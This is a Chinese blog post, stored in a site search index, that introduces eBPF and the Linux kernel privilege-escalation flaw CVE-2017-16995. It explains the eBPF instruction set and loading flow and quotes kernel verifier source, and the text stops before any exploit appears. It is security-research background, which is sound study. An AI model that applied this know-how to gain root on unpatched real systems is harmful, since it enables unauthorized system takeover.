<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ebpf入门&amp;cve-2017-16995复现</title>
    <link href="/2022/08/10/ebpf%E5%85%A5%E9%97%A8-cve-2017-16995%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/08/10/ebpf%E5%85%A5%E9%97%A8-cve-2017-16995%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CVE-2017-16995是一个ebpf模块相关的内核提权漏洞，漏洞存在于内核版本小于4.13.9的系统中，漏洞成因为kernel/bpf/verifier.c文件中的check_alu_op函数的检查问题，这个漏洞可以允许一个普通用户向系统发起拒绝服务攻击(内存破坏)或者提升到特权用户。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="eBPF简介"><a href="#eBPF简介" class="headerlink" title="eBPF简介"></a>eBPF简介</h2><p>众所周知，linux的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编写内核模块，当然内核模块只能root用户才能加载。而BPF则相当于是内核给用户开的一个绿色通道：BPF（Berkeley Packet Filter）提供了一个用户和内核之间代码和数据传输的桥梁。用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件（如往socket写数据）来触发内核执行用户提供的代码；同时以map（key，value）的形式来和内核共享数据，用户层向map中写数据，内核层从map中取数据，反之亦然。BPF设计初衷是用来在底层对网络进行过滤，后续由于他可以方便的向内核注入代码，并且还提供了一套完整的安全措施来对内核进行保护，被广泛用于抓包、内核probe、性能监控等领域。BPF发展经历了2个阶段，cBPF（classic BPF）和eBPF（extend BPF），cBPF已退出历史舞台，后文提到的BPF默认为eBPF。</p><h2 id="eBPF指令集"><a href="#eBPF指令集" class="headerlink" title="eBPF指令集"></a>eBPF指令集</h2><p>eBPF也有一套自己的指令集，可以想象成实现了一个虚拟机，其中有11个虚拟寄存器，根据调用规则可以对应到我们x86的寄存器中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">R0 -- RAX<br>R1 -- RDI<br>R2 -- RSI<br>R3 -- RDX<br>R4 -- RCX<br>R5 -- R8<br>R6 -- RBX<br>R7 -- R13<br>R8 -- R14<br>R9 -- R15<br>R10 -- RBP<br></code></pre></td></tr></table></figure><p>每条指令的格式如下，成员包括操作码，目标寄存器，源寄存器，偏移和立即数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span><br>    __u8    code;       <span class="hljs-comment">/* opcode */</span><br>    __u8    dst_reg:<span class="hljs-number">4</span>;  <span class="hljs-comment">/* dest register */</span><br>    __u8    src_reg:<span class="hljs-number">4</span>;  <span class="hljs-comment">/* source register */</span><br>    __s16   off;        <span class="hljs-comment">/* signed offset */</span><br>    __s32   imm;        <span class="hljs-comment">/* signed immediate constant */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>如一条简单的x86赋值指令：mov esi, 0xffffffff,对应的BPF指令为：BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF)，其对应的数据结构为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)\</span><br><span class="hljs-meta">((struct bpf_insn) &#123;\</span><br><span class="hljs-meta">.code  = BPF_ALU | BPF_MOV | BPF_K,\</span><br><span class="hljs-meta">.dst_reg = DST,\</span><br><span class="hljs-meta">.src_reg = 0,\</span><br><span class="hljs-meta">.off   = 0,\</span><br><span class="hljs-meta">.imm   = IMM &#125;)</span><br></code></pre></td></tr></table></figure><p>操作码共有8种大类，以低3bit区分不同操作码，BPF_ALU为计算指令，BPF_MISC为其他指令，其他指令根据名字就可以猜到其含义。<br>eBPF指令的编码如下，低三个bits被用来做指令大类的标志。这部分参考了文档，这里可以看到0x6和0x7两个指令名在源码中命名实际上是用BPF，这里只介绍eBPF。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">  +----------------+--------+--------------------+<br>  |   <span class="hljs-number">4</span> bits       |  <span class="hljs-number">1</span> bit |   <span class="hljs-number">3</span> bits           |<br>  | operation code | source | instruction <span class="hljs-class"><span class="hljs-keyword">class</span>  |</span><br><span class="hljs-class">  +----------------+--------+--------------------+</span><br><span class="hljs-class">  (<span class="hljs-title">MSB</span>)                                      (<span class="hljs-title">LSB</span>)</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">Three</span> <span class="hljs-title">LSB</span> <span class="hljs-title">bits</span> <span class="hljs-title">store</span> <span class="hljs-title">instruction</span> <span class="hljs-keyword">class</span> <span class="hljs-title">which</span> <span class="hljs-title">is</span> <span class="hljs-title">one</span> <span class="hljs-title">of</span>:</span><br><br>  Classic BPF classes:    eBPF classes:<br><br>  BPF_LD    <span class="hljs-number">0x00</span>          BPF_LD    <span class="hljs-number">0x00</span><br>  BPF_LDX   <span class="hljs-number">0x01</span>          BPF_LDX   <span class="hljs-number">0x01</span><br>  BPF_ST    <span class="hljs-number">0x02</span>          BPF_ST    <span class="hljs-number">0x02</span><br>  BPF_STX   <span class="hljs-number">0x03</span>          BPF_STX   <span class="hljs-number">0x03</span><br>  BPF_ALU   <span class="hljs-number">0x04</span>          BPF_ALU   <span class="hljs-number">0x04</span><br>  BPF_JMP   <span class="hljs-number">0x05</span>          BPF_JMP   <span class="hljs-number">0x05</span><br>  BPF_RET   <span class="hljs-number">0x06</span>          [ <span class="hljs-class"><span class="hljs-keyword">class</span> 6 <span class="hljs-title">unused</span>, <span class="hljs-title">for</span> <span class="hljs-title">future</span> <span class="hljs-title">if</span> <span class="hljs-title">needed</span> ]</span><br><span class="hljs-class">  <span class="hljs-title">BPF_MISC</span>  0<span class="hljs-title">x07</span>          <span class="hljs-title">BPF_ALU64</span> 0<span class="hljs-title">x07</span></span><br></code></pre></td></tr></table></figure><p>当指令类型为BPF_ALU or BPF_JMP，第4bit进行编码，BPF_K表示使用32位的立即数作为源操作数，BPF_X表示使用寄存器X作为源操作数。MSB的4bit表示操作数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_K     <span class="hljs-number">0x00</span><br>BPF_X     <span class="hljs-number">0x08</span><br></code></pre></td></tr></table></figure><p>当指令类型为BPF_ALU or BPF_ALU64，实际指令类型为以下之一，也就是常见的运算指令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">If <span class="hljs-title">BPF_CLASS</span><span class="hljs-params">(code)</span> </span>== BPF_ALU <span class="hljs-keyword">or</span> BPF_ALU64 [ in eBPF ], BPF_OP(code) is one of:<br><br>  BPF_ADD   <span class="hljs-number">0x00</span><br>  BPF_SUB   <span class="hljs-number">0x10</span><br>  BPF_MUL   <span class="hljs-number">0x20</span><br>  BPF_DIV   <span class="hljs-number">0x30</span><br>  BPF_OR    <span class="hljs-number">0x40</span><br>  BPF_AND   <span class="hljs-number">0x50</span><br>  BPF_LSH   <span class="hljs-number">0x60</span><br>  BPF_RSH   <span class="hljs-number">0x70</span><br>  BPF_NEG   <span class="hljs-number">0x80</span><br>  BPF_MOD   <span class="hljs-number">0x90</span><br>  BPF_XOR   <span class="hljs-number">0xa0</span><br>  BPF_MOV   <span class="hljs-number">0xb0</span>  <span class="hljs-comment">/* eBPF only: mov reg to reg */</span><br>  BPF_ARSH  <span class="hljs-number">0xc0</span>  <span class="hljs-comment">/* eBPF only: sign extending shift right */</span><br>  BPF_END   <span class="hljs-number">0xd0</span>  <span class="hljs-comment">/* eBPF only: endianness conversion */</span><br></code></pre></td></tr></table></figure><p>当指令类型为BPF_JMP ，指令实际类型为以下之一，包括条件跳转和非条件跳转。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">If <span class="hljs-title">BPF_CLASS</span><span class="hljs-params">(code)</span> </span>== BPF_JMP, BPF_OP(code) is one of:<br><br>  BPF_JA    <span class="hljs-number">0x00</span><br>  BPF_JEQ   <span class="hljs-number">0x10</span><br>  BPF_JGT   <span class="hljs-number">0x20</span><br>  BPF_JGE   <span class="hljs-number">0x30</span><br>  BPF_JSET  <span class="hljs-number">0x40</span><br>  BPF_JNE   <span class="hljs-number">0x50</span>  <span class="hljs-comment">/* eBPF only: jump != */</span><br>  BPF_JSGT  <span class="hljs-number">0x60</span>  <span class="hljs-comment">/* eBPF only: signed &#x27;&gt;&#x27; */</span><br>  BPF_JSGE  <span class="hljs-number">0x70</span>  <span class="hljs-comment">/* eBPF only: signed &#x27;&gt;=&#x27; */</span><br>  BPF_CALL  <span class="hljs-number">0x80</span>  <span class="hljs-comment">/* eBPF only: function call */</span><br>  BPF_EXIT  <span class="hljs-number">0x90</span>  <span class="hljs-comment">/* eBPF only: function return */</span><br></code></pre></td></tr></table></figure><p>举个小例子，如 BPF_ADD  |  BPF_X  |  BPF_ALU表示的含义是(u32) dst_reg + (u32) src_reg，BPF_XOR | BPF_K | BPF_ALU表示src_reg = (u32) src_reg ^ (u32) imm32。</p><h2 id="eBPF的加载过程"><a href="#eBPF的加载过程" class="headerlink" title="eBPF的加载过程"></a>eBPF的加载过程</h2><p>一个典型的BPF程序流程为：</p><ol><li>用户程序调用syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))申请创建一个map，在attr结构体中指定map的类型、大小、最大容量等属性。</li><li>用户程序调用syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))来将我们写的BPF代码加载进内核，attr结构体中包含了指令数量、指令首地址指针、日志级别等属性。在加载之前会利用虚拟执行的方式来做安全性校验，这个校验包括对指定语法的检查、指令数量的检查、指令中的指针和立即数的范围及读写权限检查，禁止将内核中的地址暴露给用户空间，禁止对BPF程序stack之外的内核地址读写。安全校验通过后，程序被成功加载至内核，后续真正执行时，不再重复做检查。</li><li>用户程序通过调用setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)将我们写的BPF程序绑定到指定的socket上。progfd为上一步骤的返回值。</li><li>用户程序通过操作上一步骤中的socket来触发BPF真正执行。<h3 id="BPF-MAP-CREATE"><a href="#BPF-MAP-CREATE" class="headerlink" title="BPF_MAP_CREATE"></a>BPF_MAP_CREATE</h3>这个系统调用首先调用map_create函数，其核心思想是对申请出一块内存空间，其大小是管理块结构体+attr参数中的size大小，为其分配fd，并将其放入到map队列中，可以用fd号来查找。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* called via syscall */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">map_create</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map</span>;</span><br><span class="hljs-keyword">int</span> err;<br><br>err = CHECK_ATTR(BPF_MAP_CREATE);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span><br><span class="hljs-built_in">map</span> = find_and_alloc_map(attr);<br><span class="hljs-keyword">if</span> (IS_ERR(<span class="hljs-built_in">map</span>))<br><span class="hljs-keyword">return</span> PTR_ERR(<span class="hljs-built_in">map</span>);<br><br>atomic_set(&amp;<span class="hljs-built_in">map</span>-&gt;refcnt, <span class="hljs-number">1</span>);<br>atomic_set(&amp;<span class="hljs-built_in">map</span>-&gt;usercnt, <span class="hljs-number">1</span>);<br><br>err = bpf_map_charge_memlock(<span class="hljs-built_in">map</span>);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">goto</span> free_map;<br><br>err = bpf_map_new_fd(<span class="hljs-built_in">map</span>);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-comment">/* failed to allocate fd */</span><br><span class="hljs-keyword">goto</span> free_map;<br><br><span class="hljs-keyword">return</span> err;<br><br>free_map:<br><span class="hljs-built_in">map</span>-&gt;ops-&gt;map_free(<span class="hljs-built_in">map</span>);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="BPF-PROG-LOAD"><a href="#BPF-PROG-LOAD" class="headerlink" title="BPF_PROG_LOAD"></a>BPF_PROG_LOAD</h3>这个系统调用用于将用户编写的EBPF规则加载进入内核，其中包含有多处校验.<h4 id="bpf-prog-load"><a href="#bpf-prog-load" class="headerlink" title="bpf_prog_load"></a>bpf_prog_load</h4>首先进入<a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/syscall.c#L621">bpf_prog_load</a>函数中，功能流程如下。<br>[1]检查的ebpf license是否为GPL证书的一种。<br>[2]检查指令条数是否超过4096。<br>[3]处利用kmalloc新建了一个bpf_prog结构体，并新建了一个用于存放EBPF程序的内存空间。<br>[4]处将用户态的EBPF程序拷贝到刚申请的内存中。<br>[5]处来判断是哪种过滤模式，其中socket_filter是数据包过滤，而tracing_filter就是对系统调用号及参数的过滤，也就是我们常见的seccomp。最终到达[5]处开始对用户输入的程序进行检查。如果通过检查就将fp中执行函数赋值为 __bpf_prog_run也就是真实执行函数，并尝试JIT加载，否则用中断的方法加载。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">bpf_prog_load</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span> <span class="hljs-title">type</span> =</span> attr-&gt;prog_type;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog</span> *<span class="hljs-title">prog</span>;</span><br><span class="hljs-keyword">int</span> err;<br><span class="hljs-keyword">char</span> license[<span class="hljs-number">128</span>];<br><span class="hljs-keyword">bool</span> is_gpl;<br><br><span class="hljs-keyword">if</span> (CHECK_ATTR(BPF_PROG_LOAD))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">/* copy eBPF program license from user space */</span><br><span class="hljs-keyword">if</span> (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),<br>      <span class="hljs-keyword">sizeof</span>(license) - <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EFAULT;<br>license[<span class="hljs-keyword">sizeof</span>(license) - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* eBPF programs must be GPL compatible to use GPL-ed functions */</span><br>[<span class="hljs-number">1</span>] is_gpl = license_is_gpl_compatible(license);<br><br>[<span class="hljs-number">2</span>]<span class="hljs-keyword">if</span> (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS) <span class="hljs-comment">// 4096</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">if</span> (type == BPF_PROG_TYPE_KPROBE &amp;&amp;<br>    attr-&gt;kern_version != LINUX_VERSION_CODE)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">if</span> (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-comment">/* plain bpf_prog allocation */</span><br>[<span class="hljs-number">3</span>]prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);<br><span class="hljs-keyword">if</span> (!prog)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>err = bpf_prog_charge_memlock(prog);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">goto</span> free_prog_nouncharge;<br><br>prog-&gt;len = attr-&gt;insn_cnt;<br><br>err = -EFAULT;<br>[<span class="hljs-number">4</span>]<span class="hljs-keyword">if</span> (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),<br>   prog-&gt;len * <span class="hljs-keyword">sizeof</span>(struct bpf_insn)) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> free_prog;<br><br>prog-&gt;orig_prog = <span class="hljs-literal">NULL</span>;<br>prog-&gt;jited = <span class="hljs-number">0</span>;<br><br>atomic_set(&amp;prog-&gt;aux-&gt;refcnt, <span class="hljs-number">1</span>);<br>prog-&gt;gpl_compatible = is_gpl ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* find program type: socket_filter vs tracing_filter */</span><br>[<span class="hljs-number">5</span>]err = find_prog_type(type, prog);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> free_prog;<br><br><span class="hljs-comment">/* run eBPF verifier */</span><br>[<span class="hljs-number">6</span>]err = bpf_check(&amp;prog, attr);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> free_used_maps;<br><br><span class="hljs-comment">/* fixup BPF_CALL-&gt;imm field */</span><br>fixup_bpf_calls(prog);<br><br><span class="hljs-comment">/* eBPF program is ready to be JITed */</span><br>err = bpf_prog_select_runtime(prog);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> free_used_maps;<br><br>err = bpf_prog_new_fd(prog);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-comment">/* failed to allocate fd */</span><br><span class="hljs-keyword">goto</span> free_used_maps;<br><br><span class="hljs-keyword">return</span> err;<br><br>free_used_maps:<br>free_used_maps(prog-&gt;aux);<br>free_prog:<br>bpf_prog_uncharge_memlock(prog);<br>free_prog_nouncharge:<br>bpf_prog_free(prog);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="bpf-check"><a href="#bpf-check" class="headerlink" title="bpf_check"></a>bpf_check</h4>下面进入加载的检查逻辑——<a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L2214">bpf_check</a>，功能流程如下。<br>[1]处将特定指令中的mapfd换成相应的map实际地址，这里需要注意，map实际地址是一个内核地址，有8字节，这样就需要有两条指令的长度来存这个地址，具体可以看下面对这个函数的分析。<br>[2]中借用了程序控制流图的思路来检查这个eBPF程序中是否有死循环和跳转到未初始化的位置，造成无法预期的风险。<br>[3]是实际模拟执行的检测当上述有任一出现问题的检测，是检测的重点。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bpf_check</span><span class="hljs-params">(struct bpf_prog **prog, <span class="hljs-keyword">union</span> bpf_attr *attr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> __user *log_ubuf = <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">verifier_env</span> *<span class="hljs-title">env</span>;</span><br><span class="hljs-keyword">int</span> ret = -EINVAL;<br><br><span class="hljs-comment">// 指令条数判断</span><br><span class="hljs-keyword">if</span> ((*prog)-&gt;len &lt;= <span class="hljs-number">0</span> || (*prog)-&gt;len &gt; BPF_MAXINSNS)<br><span class="hljs-keyword">return</span> -E2BIG;<br><br><span class="hljs-comment">/* &#x27;struct verifier_env&#x27; can be global, but since it&#x27;s not small,</span><br><span class="hljs-comment"> * allocate/free it every time bpf_check() is called</span><br><span class="hljs-comment"> */</span><br>env = kzalloc(<span class="hljs-keyword">sizeof</span>(struct verifier_env), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!env)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>env-&gt;prog = *prog;<br><br><span class="hljs-comment">/* grab the mutex to protect few globals used by verifier */</span><br>mutex_lock(&amp;bpf_verifier_lock);<br><br><span class="hljs-keyword">if</span> (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;<br><span class="hljs-comment">/* user requested verbose verifier output</span><br><span class="hljs-comment"> * and supplied buffer to store the verification trace</span><br><span class="hljs-comment"> */</span><br>log_level = attr-&gt;log_level;<br>log_ubuf = (<span class="hljs-keyword">char</span> __user *) (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) attr-&gt;log_buf;<br>log_size = attr-&gt;log_size;<br>log_len = <span class="hljs-number">0</span>;<br><br>ret = -EINVAL;<br><span class="hljs-comment">/* log_* values have to be sane */</span><br><span class="hljs-keyword">if</span> (log_size &lt; <span class="hljs-number">128</span> || log_size &gt; UINT_MAX &gt;&gt; <span class="hljs-number">8</span> ||<br>    log_level == <span class="hljs-number">0</span> || log_ubuf == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> free_env;<br><br>ret = -ENOMEM;<br>log_buf = vmalloc(log_size);<br><span class="hljs-keyword">if</span> (!log_buf)<br><span class="hljs-keyword">goto</span> free_env;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>log_level = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 将伪指令中操作map_fd的部分替换成map地址，注意这个地址是8字节的，因此在实现中用本指令的imm和下一条指令的2个4字节中存储了这个地址</span><br>[<span class="hljs-number">1</span>]ret = replace_map_fd_with_map_ptr(env);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> skip_full_check;<br><br>env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,<br>       <span class="hljs-keyword">sizeof</span>(struct verifier_state_list *),<br>       GFP_USER);<br>ret = -ENOMEM;<br><span class="hljs-keyword">if</span> (!env-&gt;explored_states)<br><span class="hljs-keyword">goto</span> skip_full_check;<br><br>[<span class="hljs-number">2</span>]ret = check_cfg(env);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> skip_full_check;<br><br>env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);<br><br>[<span class="hljs-number">3</span>]ret = do_check(env);<br><br>skip_full_check:<br><span class="hljs-keyword">while</span> (pop_stack(env, <span class="hljs-literal">NULL</span>) &gt;= <span class="hljs-number">0</span>);<br>free_states(env);<br><br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br><span class="hljs-comment">/* program is valid, convert *(u32*)(ctx + off) accesses 